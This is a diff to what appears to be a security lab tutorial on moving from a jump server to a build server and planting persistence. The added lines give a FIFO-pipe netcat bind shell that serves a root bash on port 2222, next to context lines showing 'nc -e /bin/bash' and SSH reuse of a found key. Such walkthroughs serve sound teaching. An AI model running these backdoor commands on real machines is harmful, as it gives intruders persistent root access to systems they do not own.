@@ -113,7 +113,7 @@ So now, we can connect to the build server:
 
 ```sh
 # note: use the command that appeared in your history for a valid user/IP
-ssh -i ~/.ssh/buildbox_id JUMPSERVER_USER@JUMPSERVER_IP
+ssh -i ~/.ssh/buildbox_id BUILDBOX_USER@BUILDBOX_IP
 ```
 
 Looking around here shows that the machine is set up the same way.
@@ -202,7 +202,15 @@ sudo nc -l -p 2222 -e "/bin/bash" &
 disown
 ```
 
-You can skip this last step if it does not work, as the demo machines may not be reachable on port 2222. If the network is open, however, we could then reconnect to the machine later from any machine:
+On some machines, `nc` might error, saying that the `-e` flag doesn't exist. If that is the case, we'll need to use a FIFO pipe trick to get the input and output of netcat into a bash process:
+
+```sh
+mkfifo loop_pipe
+nc -l -p 2222 < loop_pipe | sudo /bin/bash > loop_pipe &
+disown
+```
+
+If the network is open to the build box server, we can now reconnect from any machine. You can skip this next step if it does not work, as the demo machines may not be reachable on port 2222, depending on how they were originally created. 
 
 ```sh
 # on the attacker's machine
